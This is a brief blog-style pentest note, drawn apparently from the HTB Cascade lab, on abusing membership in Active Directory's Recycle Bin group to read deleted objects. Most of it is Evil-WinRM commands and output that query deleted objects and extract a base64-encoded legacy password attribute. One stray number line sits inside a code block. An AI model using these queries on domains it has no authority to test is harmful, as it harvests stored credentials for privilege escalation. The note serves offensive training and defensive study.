---
layout: post
title: AD Recycle Bin
description: AD Recycle Bin
summary: AD Recycle Bin
tags: [windows,ad,pivot,privesc]
minute: 1
---
## Overview
Attacker can retrieve juicy information from deleted AD Objects if he had gained access to a low-privileged user that has access in deleted AD objects.

## Environment Setup and Requirements
* Low privileged user that can access deleted AD objects

## Steps
* Check current permission

```powershell
*Evil-WinRM* PS C:\users\arksvc> whoami /all | findstr /i recycle
CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
*Evil-WinRM* PS C:\users\arksvc> 
```

* Check if you can see deleted objects

```powershell
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
```

* Find juicy information

```powershell
45689883479503
*Evil-WinRM* PS C:\users> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties * | findstr cascadeLegacyPwd
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
*Evil-WinRM* PS C:\users> 
```

## References
* HTB Cascade
* [Active Directory Recycle Bin | Recover Deleted AD Object | AD Deleted Objects](https://stealthbits.com/blog/active-directory-object-recovery-recycle-bin/)
* [ACTIVE DIRECTORY OBJECT RECOVERY (RECYCLE BIN)](https://stealthbits.com/blog/active-directory-object-recovery-recycle-bin/)